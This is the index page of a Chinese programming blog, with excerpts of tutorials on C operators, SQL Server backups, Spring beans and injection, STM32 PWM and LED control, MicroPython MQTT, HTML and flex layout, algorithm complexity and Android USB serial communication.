<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26200363ba807dc20ca7f34e8596e0b9/" rel="bookmark">
			9、位和逗号的运算符与表达式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、位逻辑运算符与位逻辑表达式
1. 位逻辑运算符
2. 位逻辑表达式
二、逗号运算符与逗号表达式
一、位逻辑运算符与位逻辑表达式 1. 位逻辑运算符 位逻辑运算符包括位逻辑与、位逻辑或、位逻辑非和取补
注意：表中除了最后一个运算符是单目运算符外，其他都是双目运算符，这些运算符只能用于整型表达式。位逻辑运算符通常用于对整型变量进行位的设置、清零和取反，以及对某些选定的位进行检测。
2. 位逻辑表达式 在程序中，位逻辑运算符一般被程序员用作开关标志。
示例：位逻辑与运算符的典型应用，对某个语句的位设置进行检查：
上述语句的含义是：if语句对后面括号中的表达式进行检测。如果表达式返回的是真值，则执行下面的语句块，否则跳过该语句块，不执行。其中，运算符用来对BITMASK变量的位进行检测，判断其是否与Field变量的位有相吻合之处。
二、逗号运算符与逗号表达式 逗号表达式称为顺序求值运算符。逗号表达式的一般形式如下：
逗号表达式的求解过程是：先求解表达式1，再求解表达式2，一直求解到表达式n。整个逗号表达式的值是表达式n的值。
再看下面代码：
在上面的语句中，Value所得到的值为7，而非12。整个逗号表达式的值不应该是最后一个表达式的值吗？为什么不等于12呢？答案在于优先级的问题，由于赋值运算符的优先级比逗号运算符的优先级高，因此先执行赋值的运算。如果要先执行逗号运算，则可以使用括号运算符，代码如下：
使用括号之后，Value的值为12。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64d2ea051702a0999e306e14a2b4d3a2/" rel="bookmark">
			SQL Server 2008如何创建定期自动备份任务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们知道，利用SQL Server 2008数据库可以实现数据库的定期自动备份。方法是用SQL SERVER 2008自带的维护计划创建一个计划对数据库进行备份，下面我们将SQL SERVER 2008定期自动备份的方法分享给大家。
首先需要启动SQL Server Agent服务，这个服务如果不启动是无法运行新建作业的，点击“开始”–“所有程序”–“Microsoft SQL Server 2008”–“启动SQL Server Management Studio”登录数据库，点击管理–维护计划–右击维护计划向导
点击“维护计划向导”后跳出对话框,继续下一步
填写好名称及相关说明作个记号，点击“更改” 来设定维护计划
可以为选择执的时间段，每天、每周、每月可以根据你相应的需求来制定备份的时间，这里作演示就选择在每天的0：00进行，点击“确定”再点“下一步”。
选择你需要备份的任务，我这里就先择“备份数据库（完整、差异、事务日志）”，很明了 点击“下一步”
出现刚刚所选择的三项你可以选择他们所执行的顺序，选好后点击“下一步”
在数据库那一列选择相关数据库点击（确定）
选择备份的数据库存放的目录，设置备份压缩：有默认服务器设置，压缩备份等选项，因为我的数据库较大所以就选择压缩，根据您的实际情况进行操作：点击”下一步”，下面的操作是对于这前我们所选择的“维护任务”操作和“上一步”一样这里就不截图说明，最后点击“下一步”
选择SQL SERVER 2008自动备份维护计划的报告文件所存放位置点击“下一步”如图所示:
点击“完成”这样就完成了SQL SERVER 2008自动备份。
注意：在利用SQL SQLSERVER 2008 的维护计划对数据库进行定期的备份时要启动“SQL SERVER 代理”服务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0462ccd4f8df8e44b6bb8cd068edda51/" rel="bookmark">
			【Spring】Spring的循环依赖及解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者简介：大家好，我是五度鱼，一个普通的Java领域博主，不停输出Java技术博客和干货。座右铭：锲而不舍，金石可镂。个人主页：五度鱼学Java的主页 文章目录 前言1. singleton下的set注入产生的循环依赖2. prototype下的set注入产生的循环依赖3. singleton下的构造注入产生的循环依赖4. Spring解决循环依赖的机理 前言 在Spring框架中，循环依赖是一个非常常见的问题。当两个或多个bean之间相互依赖时，就会产生循环依赖。这种情况可能会导致程序无限循环，从而导致性能问题和程序崩溃。
Spring框架通过检测循环依赖并采取相应措施来解决这个问题。例如，使用懒加载的方式来避免循环依赖。但是，有时候我们的代码中可能会有一些错误，导致循环依赖的产生。
在这篇博客中，我们将深入探讨Spring循环依赖的问题。我们将讨论如何产生循环依赖，以及如何避免和解决循环依赖。我们还将深入探讨Spring框架如何检测和解决循环依赖。通过本文的阅读，你将能够更好地了解循环依赖的问题，并能够编写出更健壮的代码。
1. singleton下的set注入产生的循环依赖 编写程序，测试一下在singleton+setter的模式下产生的循环依赖，Spring是否能够解决？
package com.powernode.spring6.bean; /** * @author 五度鱼 * @version 1.0 * @className Husband * @since 1.0 **/ public class Husband { private String name; private Wife wife; public void setName(String name) { this.name = name; } public String getName() { return name; } public void setWife(Wife wife) { this.wife = wife; } // toString()方法重写时需要注意：不能直接输出wife，输出wife.getName()。要不然会出现递归导致的栈内存溢出错误。 @Override public String toString() { return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0462ccd4f8df8e44b6bb8cd068edda51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f236b77ebfdc722898866d323b6500c/" rel="bookmark">
			【Spring】Spring的Bean的生命周期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者简介：大家好，我是五度鱼，一个普通的Java领域博主，不停输出Java技术博客和干货。座右铭：锲而不舍，金石可镂。个人主页：五度鱼学Java的主页 文章目录 前言1. 什么是Bean的生命周期？2. 为什么要知道Bean的生命周期？3. Bean的生命周期之5步4. Bean的生命周期之7步5. Bean的生命周期之10步6. Bean的作用域不同，管理方式不同7. 自己new的对象如何让Spring管理 前言 在Java中，Bean是一个重要的概念，它代表了应用程序中的一个对象。在开发中，我们经常使用Bean来管理对象的生命周期。本文将介绍Bean的生命周期，并详细讲解如何在Spring框架中管理Bean的生命周期。
1. 什么是Bean的生命周期？ Spring其实就是一个管理Bean对象的工厂。它负责对象的创建，对象的销毁等。
所谓的生命周期就是：对象从创建开始到最终销毁的整个过程。Spring为每个Bean定义了若干个回调方法，使得开发人员可以在某个特定的时间点对Bean进行特定的操作。
2. 为什么要知道Bean的生命周期？ 其实生命周期的本质是：在哪个时间节点上调用了哪个类的哪个方法。
我们需要充分的了解在这个生命线上，都有哪些特殊的时间节点。
只有我们知道了特殊的时间节点都在哪，到时我们才可以确定代码写到哪。
我们可能需要在某个特殊的时间点上执行一段特定的代码，这段代码就可以放到这个节点上。当生命线走到这里的时候，自然会被调用。
3. Bean的生命周期之5步 Bean生命周期的管理，可以参考Spring的源码：AbstractAutowireCapableBeanFactory类的doCreateBean()方法。`
Bean生命周期可以粗略的划分为五大步：
第一步：实例化Bean第二步：Bean属性赋值第三步：初始化Bean第四步：使用Bean第五步：销毁Bean 编写测试程序：
定义一个Bean
package com.powernode.spring6.bean; /** * @author 五度鱼 * @version 1.0 * @className User * @since 1.0 **/ public class User { private String name; public User() { System.out.println("1.实例化Bean"); } public void setName(String name) { this.name = name; System.out.println("2.Bean属性赋值"); } public void initBean(){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f236b77ebfdc722898866d323b6500c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0bbf65d9e8cd9e1cdbdc123b146a176/" rel="bookmark">
			stm32-PWM原理和代码解读（定时器补充）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、介绍 脉冲宽度调制(PWM)，是英文 “Pulse Width Modulation”的缩写，简 称脉宽调制，是利用微处理器的数字输出来对模拟电路进行控制的一种 非常有效的技术。简单一点，就是对脉冲宽度的控制。 STM32 的定时器除了 TIM6 和 7 。其他的定时器都可以用来产生 PWM 输出。其 中高级定时器 TIM1 和 TIM8 可以同时产生多达 7 路的 PWM 输出。而通用定时 器也能同时产生多达 4路的 PWM 输出，这样， STM32 最多可以同时产生 30 路48 PWM 输出！ 相关重要理论： 面积等效原理：冲量相等而形状不同的窄脉冲施加在惯性环节上时，其效果基本相同。 二、框图 1、输入捕获 输入捕获可以对输入的信号的上升沿、下降沿或者双边沿进行捕获，常用的有测量输入信号的脉宽和测量PWM输入信号的频率和占空比这两种。
PWM输入模式是输入捕获的特例，只能使用通道1和通道2，通道3和通道4使用不了。与上面那种只使用一个捕获寄存器测量脉宽和频率的方法相比，PWM输入模式需要占用两个捕获寄存器，
当使用PWM输入模式的时候，因为一个输入通道（TIx）会占用两个捕获通道（ICx），所以一个定时器在使用PWM输入的时候最多只能使用两个输入通道（TIx）。我们以输入通道TI1工作在PWM输入模式为例来讲解具体的工作原理，其他通道以此类推即可。PWM信号由输入通道TI1进入，因为是PWM输入模式的缘故，信号会被分为两路：一路是TI1FP1，另外一路是TI2FP2。其中一路是周期，另一路是占空比，具体一路信号对应周期还是占空比，得从程序上设置哪一路信号作为触发输入，作为触发输入的哪一路信号对应的就是周期，另一路就是对应占空比。作为触发输入的那一路信号还需要设置极性，是上升沿还是下降沿捕获。一旦设置好触发输入的极性，另外一路硬件就会自动配置为相反的极性捕获，无需软件配置。一句话概括就是：选定输入通道，确定触发信号，然后设置触发信号的极性即可。因为是PWM输入的缘故，另一路信号则由硬件配置，无需软件配置。使用PWM输入模式的时候必须将从模式控制器配置为复位模式（配置寄存器SMCR的位SMS[2:0]来实现），即当我们启动触发信号开始进行捕获的时候，同时把计数器CNT复位清零。
当使用PWM输入模式的时候，因为一个输入通道（TIx）会占用两个捕获通道（ICx），所以一个定时器在使用PWM输入的时候最多只能使用两个输入通道（TIx）。我们以输入通道TI1工作在PWM输入模式为例来讲解具体的工作原理，其他通道以此类推即可。PWM信号由输入通道TI1进入，因为是PWM输入模式的缘故，信号会被分为两路：一路是TI1FP1，另外一路是TI2FP2。其中一路是周期，另一路是占空比，具体一路信号对应周期还是占空比，得从程序上设置哪一路信号作为触发输入，作为触发输入的哪一路信号对应的就是周期，另一路就是对应占空比。作为触发输入的那一路信号还需要设置极性，是上升沿还是下降沿捕获。一旦设置好触发输入的极性，另外一路硬件就会自动配置为相反的极性捕获，无需软件配置。一句话概括就是：选定输入通道，确定触发信号，然后设置触发信号的极性即可。因为是PWM输入的缘故，另一路信号则由硬件配置，无需软件配置。使用PWM输入模式的时候必须将从模式控制器配置为复位模式（配置寄存器SMCR的位SMS[2:0]来实现），即当我们启动触发信号开始进行捕获的时候，同时把计数器CNT复位清零。 2、输出比较 输出模式控制器：
除此之外还有六种模式但基本不用。
三、代码分析 初始化
void TIM4_PWM_Init(u16 arr,u16 psc) { GPIO_InitTypeDef GPIO_InitStructure; TIM_TimeBaseInitTypeDef TIM_TimeBaseStructure; TIM_OCInitTypeDef TIM_OCInitStructure; RCC_APB1PeriphClockCmd(RCC_APB1Periph_TIM4, ENABLE);	//使能定时器4时钟 RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB|RCC_APB2Periph_AFIO , ENABLE); //使能GPIO外设和AFIO复用功能模块时钟 //设置该引脚为复用输出功能,输出TIM4 CH2的PWM脉冲波形	GPIOB.7 GPIO_InitStructure.GPIO_Pin = GPIO_Pin_7; //TIM4_CH2 GPIO_InitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0bbf65d9e8cd9e1cdbdc123b146a176/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8878ba2f8b3cb4f192c853a81832f92a/" rel="bookmark">
			micropython  查询MQTT是否连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 要查询 MicroPython 中的 MQTT 连接状态，可以使用 client.is_connected() 方法。在使用之前，需要先创建一个 MQTT 客户端对象，并使用 connect() 方法连接到 MQTT 服务器。示例代码如下:
from umqtt.simple import MQTTClient client = MQTTClient(client_id, server) client.connect() if client.is_connected(): print("MQTT Connected") else: print("MQTT No 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/130644df89762ee50fcca3743d60d13d/" rel="bookmark">
			HTML零散知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、代码规范与思路 参考凹凸实验室代码规范：Aotu.io - 前端代码规范
CSS编写顺序的思路
先确定盒子本身是如何布局
position: absolutefloat: left/rightdisplay: flex 盒子的特性和可见性
display: block/inline-block/inline/nonevisibility/opacity 盒子模型
width/heightbox-sizingmargin/border/padding/contentbox-shadow/text-shadow 内部的文本文字
font/text background
background-image/size/position/color 其他
transform/transition/overflow/white-space 2、meta元素 meta元素用于定义元数据：
head中用于定义元数据；比如标题title、样式style、link外部资源等；meta用于定义那些不能使用其他定元相关（meta-related）元素定义的任何元数据信息； meta 元素定义的元数据的类型包括以下几种：
如果设置了 charset 属性，meta 元素是一个字符集声明，告诉文档使用哪种字符编码。如果设置了 http-equiv 属性，meta 元素则是编译指令。如果设置了 name 属性，meta 元素提供的是文档级别（document-level）的元数据，应用于整个页面。 2.1、meta元素的http-equiv属性 我们会发现，默认创建的html页面都有如下代码：
它的作用到底是什么呢？网上众说纷纭，我们直接看官方文档的解释：
告知IE浏览器去模仿哪一个浏览器的行为；IE=edge，告知IE8区使用最高有效模式来模仿； 2.2、meta元素的name属性 name属性的值非常多，具体的内容可以查看文档：标准元数据名称 - HTML（超文本标记语言） | MDN
我们介绍几个常用的：
robots：爬虫、协作搜寻器，或者 “机器人”，对此页面的处理行为，或者说，应当遵守的规则。author：文档作者的名字。Copyright：版权声明；description：一段简短而精确的、对页面内容的描述。 一些浏览器，比如 Firefox 和 Opera，将其用作书签的默认描述。keywords：与页面内容相关的关键词，使用逗号分隔。某些搜索引擎会进行收录； 3、CSS样式的字符编码 之前我们有制定过HTML页面的编码，但是并没有制定CSS样式的编码。
那么CSS样式的字符编码会按照什么规则来使用呢？ 在样式表中有多种方法去声明字符编码，浏览器会按照以下顺序尝试下边的方法（一旦找到就停止并得出结果）：
文件的开头的 Unicode byte-order（字节顺序标记） 字符值。 https://en.wikipedia.org/wiki/Byte_order_mark由Content-Type：HTTP header 中的 charset 属性给出的值或用于提供样式表的协议中的等效值。CSS @规则 @charset。使用参考文档定义的字符编码： &lt;link&gt; 元素的 charset 属性。 该方法在 HTML5 标准中已废除，无法使用。假设文档是 UTF-8。 开发中推荐在CSS的开头编写@charset指定编码：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/130644df89762ee50fcca3743d60d13d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0ec91a4426a97836084579e4e89914c/" rel="bookmark">
			RTOS学习（5）--时间戳
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在μC/OS-III中，很多地方有测量时间的函数，虽然和我们编写程序没有太大关系，但是如果我们想知道某段程序的运行时间，一个比较好的办法就是时间戳。
大致的原理就是在程序的开始获取一次时间TimStart，在一段程序结束的时候重新获取一次时间称为TimEnd，那么这两次时间点相减就是这段程序的运行时间。
下面的问题就是如何去获取时间，在是 ARM Cortex-M系列的内核中有一个外设DWT可以帮助我们解决这个问题。在DWT中有一个32位的寄存器叫CYCCNT。它是一个向上的计数器，记录内核时钟HCLK的运行次数，当CYCCNT溢出后，会自动清零，然后重新向上计数。
以F1系列为例，如果HCLK时钟为72M，那么单个时钟的周期为1/72us，约为14us，那么CYCCNT总共能记录的时间为（ *14）us=60S，一分钟的时间估计程序已经跑了好几遍了，所以不用考虑溢出的问题。
时间戳的初始化
在CPU_Init里面有三个初始化函数，分别是时间戳、最大关中断时间测量、CPU名字的初始化。CPU_TS_Init是时间戳的初始化。
CPU_TS_Init
这其中比较重要的就是在这一段话，
CPU_TS_TmrFreq_Hz表示CPU系统时钟频率，初始化时先清零。
CPU_TS_TmrInit
首先获取系统时钟频率，幅值给fclk_freq，紧接着下面三句话就是对DWT的初始化，直接对寄存器进行操作。CPU_TS_TmrFreqSet函数比较简单，就是对CPU_TS_TmrFreq_Hz进行幅值。
OS_TS_GET函数获取时间戳
可以看到实际上是对CPU_TS_TmrRd的一个重定义，实际上是调用CPU_TS_TmrRd函数。
从这里也能看出，获取时间节点，实际上就是读取DWT的CYCCNT寄存器。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af1ee6cecb7e1814895310718bda79ab/" rel="bookmark">
			【数据结构初阶】第一篇——算法性能分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		算法效率
什么是大O
时间复杂度分析
概念
大O渐进表示法
不同数据规模的差异
复杂表达式的化简
O(logn)中的log是以什么为底?
案例分析
算法为什么会超时
递归算法的时间复杂度
空间复杂度分析
概念
案例分析
递归算法的性能分析
代码的内存消耗
算法效率 算法效率分析分为两种:第一是时间效率，第二是空间效率。时间效率被称为时间复杂度，空间效率被称为空间复杂度。
时间复杂度主要衡量的是一个算法的运行速度，而空间复杂度主要衡量一个算法所需要的额外空间。在计算机发展的早期，计算机的存储空间很小，所以对空间复杂度很是在乎。但是随着计算机行业的迅速发展，计算机的存储容量已经达到了很高的程度。所以如今已经不需要再特别关注一个算法的空间复杂度。这就是为什么我们大多时候听到的是时间复杂度，而很少听到空间复杂度的原因。
什么是大O 这里的大O是指什么?说到时间复杂度，大家都知道O(n),O(n^2),却说不清什么是大O.
算法导论中说道:大O是用来表示上界的，当用它作为算法的最坏情况运行时间的上界，就是对任意数据输入的运行时间的上界。
同样算法导论中给出了例子:拿插入排序来说，插入排序的时间复杂度为O(n^2).
输入数据的形式对程序运算时间是有很大影响的，在数据本来就有序的情况下时间复杂度为O(n),但如果数据是逆序的话，插入排序的时间复杂度就是O(n^2),也就对于所有输入情况来说，最坏是O(n^2)的时间复杂度，所以称插入排序的时间复杂度为O(n^2)。
同样的同理再看一下快速排序，都知道快速排序是O(nlogn)，但是当数据已经有序情况下，快速排序的时间复杂度是O(n^2) 的，所以严格从大O的定义来讲，快速排序的时间复杂度应该O(n^2)。
但是我们依然说快速排序是O(nlogn)的时间复杂度，这个就是业内的一个默认规定，这里说的O代表的就是一般情况，而不是严格的上界。如图所示：
我们主要关心的还是一般情况下的数据形式。
面试中说道算法的时间复杂度是多少指的都是一般情况。但是如果面试官和我们深入探讨一个算法的实现以及性能的时候，就要时刻想着数据用例的不一样，时间复杂度也是不同的，这一点是一定要注意的。
时间复杂度分析 概念 时间复杂度的定义：在计算机科学中，算法的时间复杂度是一个函数，它定量描述了该算法的运行时间。一个算法执行所耗费的时间，从理论上说，是不能算出来的，只有你把你的程序放在机器上跑起来，才能知道。但是我们需要每个算法都上机测试吗？是可以都上机测试，但是这很麻烦，所以才有了时间复杂度这个分析方式。一个算法所花费的时间与其中语句的执行次数成正比例，算法中的基本操作的执行次数，为算法的时间复杂度。
先来看看下面这串代码，计算一下Func1中++count语句总共执行了多少次?
void Func1(int N) { int count = 0; //代码1 for (int i = 0; i &lt; N; ++i) { for (int j = 0; j &lt; N; ++j) { ++count; } } //代码2 for (int k = 0; k &lt; 2 * N; ++k) { ++count; } //代码3 int M = 10; while (M--) { ++count; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af1ee6cecb7e1814895310718bda79ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa93de41be08c46b5cdd2bed96b7ea4a/" rel="bookmark">
			【Spring】Spring的IOC依赖注入的四种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者简介：大家好，我是五度鱼，一个普通的Java领域博主，不停输出Java技术博客和干货。
座右铭：锲而不舍，金石可镂。
个人主页：五度鱼学Java的主页
文章目录 前言1. set注入2. 构造注入3. p命名空间注入4. c命名空间注入 前言 这几天学了Spring6，感觉到了Spring的强大和便捷。其中的IOC设计原则对对象的处理真的是达到了出神入化的地步，省去了不停的创建对象的过程。写此篇文章是为了总结一下IOC的四种属性注入方式，也是为了以后可以翻看，每日温习一遍，孔子说过：“温故而知新，可以为师矣”。各位朋友们在浏览此篇博客时可以温习一下IOC的知识。
1. set注入 set注入是基于set方法注入的，它的底层是通过反射机制调用属性对应的set方法给属性赋值，这种方式必须要求属性对外提供set方法，让两个对象之间产生关系。
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.powernode&lt;/groupId&gt; &lt;artifactId&gt;spring6-002-dependency-injection&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;repository.spring.milestone&lt;/id&gt; &lt;name&gt;Spring Milestone Repository&lt;/name&gt; &lt;url&gt;https://repo.spring.io/milestone&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;6.0.0-M2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.13.2&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;17&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;17&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;/project&gt; package com.powernode.spring6.dao; /** * @author 五度鱼 * @version 1.0 * @className UserDao * @since 1.0 **/ public class UserDao { public void insert(){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa93de41be08c46b5cdd2bed96b7ea4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d98a39e6516fcff3694c5fea27175ca/" rel="bookmark">
			Flex布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、认识flex布局 1.1、认识flexbox Flexbox翻译为弹性盒子:
弹性盒子是一种用于按行或按列布局元素的一维布局方法 ;元素可以膨胀以填充额外的空间, 收缩以适应更小的空间;通常我们使用Flexbox来进行布局的方案称之为flex布局(flex layout); flex布局是目前web开发中使用最多的布局方案：
flex 布局（Flexible 布局，弹性布局）;目前特别在移动端可以说已经完全普及;在PC端也几乎已经完全普及和使用, 只有非常少数的网站依然在用浮动来布局; 为什么需要flex布局呢?
长久以来，CSS 布局中唯一可靠且跨浏览器兼容的布局工具只有 floats 和 positioning。但是这两种方法本身存在很大的局限性, 并且他们用于布局实在是无奈之举; 1.2、原先的布局存在的痛点 原来的布局存在哪些痛点呢? 举例说明:
比如在父内容里面垂直居中一个块内容。比如使容器的所有子项等分可用宽度/高度，而不管有多少宽度/高度可用。比如使多列布局中的所有列采用相同的高度，即使它们包含的内容量不同。 1.3、flex布局的出现 所以长久以来, 大家非常期待一种真正可以用于对元素布局的方案：于是flex布局出现了;flexbox在使用时, 我们最担心的是它的兼容性问题：我们可以在caniuse上查询到具体的兼容性 2、flex布局 2.1、flex布局的重要概念 两个重要的概念：
开启了 flex 布局的元素叫 flex containerflex container 里面的直接子元素叫做 flex item 当flex container中的子元素变成了flex item时, 具备一下特点:
flex item的布局将受flex container属性的设置来进行控制和布局;flex item不再严格区分块级元素和行内级元素;flex item默认情况下是包裹内容的, 但是可以设置宽度和高度; 设置 display 属性为 flex 或者 inline-flex 可以成为 flex container
flex： flex container 以 block-level 形式存在inline-flex： flex container 以 inline-level 形式存在 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d98a39e6516fcff3694c5fea27175ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/475360b626718a84190e5947c90f7eb0/" rel="bookmark">
			最详细蓝桥杯嵌入式完整教程（二）：点亮LED
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在创建完工程模板之后，我们正式开始学习，首先开始的是学习每个开发板都必备的“Hello World“——点亮LED。
第一步，我们首先要知道配置LED的硬件信息。（可以在产品手册中查询）
第二步，在了解完LED的端口之后，我们在建立工程模板时建立的cubeMx的基础上开始LED的初始化配置。
将PC8-PC15和PD2的端口全部设置成GPIO_Output。
到此为止，我们在cubeMx里的配置全部完成，然后选择创建工程。
第三步，打开工程中的keil，创建LED的C文件和H文件。
第四步，创建一个bsp文件。
到此为止，前面的准备我们已经全部完成，接下来我们正式开始。
先编写LED的控制函数。
#include "led.h"
void LED_Display(uchar Display_LED)
{
//把所有LED置高电平（LED熄灭）
HAL_GPIO_WritePin(GPIOC,GPIO_PIN_All,GPIO_PIN_SET);
//使LED_Display控制的LED亮
HAL_GPIO_WritePin(GPIOC,Display_LED&lt;&lt;8,GPIO_PIN_RESET);
//打开锁存器
HAL_GPIO_WritePin(GPIOD,GPIO_PIN_2,GPIO_PIN_SET);
//关闭锁存器
HAL_GPIO_WritePin(GPIOD,GPIO_PIN_2,GPIO_PIN_RESET);
}
#ifndef _LED_H_
#define _LED_H_
#include "main.h"
void LED_Display(uchar Display_LED);
#endif 到此为止，我们完成了点亮LED。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07375a2958bda28ae78ff3afb14eb533/" rel="bookmark">
			Android 开源USB读写demo,实现串口通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSDN 下载链接https://download.csdn.net/download/gao511147456/87226599（可0积分免费下载）
如果你不想下载可以阅读下面教程并复制代码到自己的项目中
这是我插拔USB的运行视频 device-2022-11-27-231324
AndroidManifest &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" package="com.rongzl.usbdemo"&gt; &lt;!-- 添加1 --&gt; &lt;uses-feature android:name="android.hardware.usb.host" android:required="true"/&gt; &lt;application android:allowBackup="true" android:dataExtractionRules="@xml/data_extraction_rules" android:fullBackupContent="@xml/backup_rules" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.USBdemo" tools:targetApi="31"&gt; &lt;activity android:name=".MainActivity" android:exported="true"&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.MAIN" /&gt; &lt;category android:name="android.intent.category.LAUNCHER" /&gt; &lt;!-- 添加2 --&gt; &lt;action android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED" /&gt; &lt;/intent-filter&gt; &lt;!-- 添加3 --&gt; &lt;meta-data android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED" android:resource="@xml/device_filter" /&gt; &lt;/activity&gt; &lt;/application&gt; &lt;/manifest&gt; MainActivity private static final String TAG = "MainActivity"; private UsbManager mUsbManager; private UsbDevice mDevice; private UsbInterface inft; private AppCompatButton btSend; private UsbEndpoint mEndpointIN; private UsbEndpoint mEndpointOUT; private UsbDeviceConnection mUsbConnection; private TextView mTextView; private TextView mTextViewDeviceStatus; private TextView mTextViewDeviceInfo; 初始USB端口 mDevice.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07375a2958bda28ae78ff3afb14eb533/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1fac7d63d917b26b374bec92f0e2f7a/" rel="bookmark">
			蓝桥杯之嵌入式备战（串口通信）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 序言
一.原理图
二.STM32CubeMX的配置
三.代码的编写
总结
序言 本文实现了串口的重定向，并讲述其中遇到的一些问题。
一.原理图 由原理图可知串口通信主要用到的引脚为PA9和PA10
